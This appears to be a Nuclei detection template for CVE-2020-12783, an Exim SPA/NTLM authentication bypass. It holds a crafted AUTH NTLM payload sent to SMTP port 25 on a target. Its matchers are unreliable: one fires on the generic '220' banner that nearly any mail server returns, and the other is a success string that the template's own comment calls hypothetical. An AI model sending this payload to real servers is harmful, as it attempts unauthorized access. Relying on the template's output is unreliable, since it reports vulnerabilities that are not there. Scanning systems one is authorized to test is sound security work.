id: CVE-2020-12783

info:
  name: Exim SPA Authentication Bypass Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Exim through 4.93 has an out-of-bounds read in the SPA authenticator that could result in SPA/NTLM authentication bypass in auths/spa.c and auths/auth-spa.c.
  remediation: |
    Update Exim to the latest version to mitigate the vulnerability. Consider configuring and enabling additional security measures like firewalls to restrict access to the SMTP service.
  reference:
    - http://www.openwall.com/lists/oss-security/2021/05/04/7
    - https://bugs.exim.org/show_bug.cgi?id=2571
tcp:
  - inputs:
      - data: "EHLO test.org\r\nAUTH NTLM\r\no\u0000r\u0000a\u0000n\u0000g\u0000e\u0000\u0000BDDCCCCBBGGp\u0004\u0000\u0000BBCCCC\u000e\u0000\u000e\u0000\u000e\u0000\u0000\u0000\u0000\u0000\r\nQUIT\r\n"
    host:
      - "{{Hostname}}"
    port: 25
    read-size: 1024

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "220"  # Typical SMTP response code for service ready
          - "Authentication successful"  # Hypothetical success message
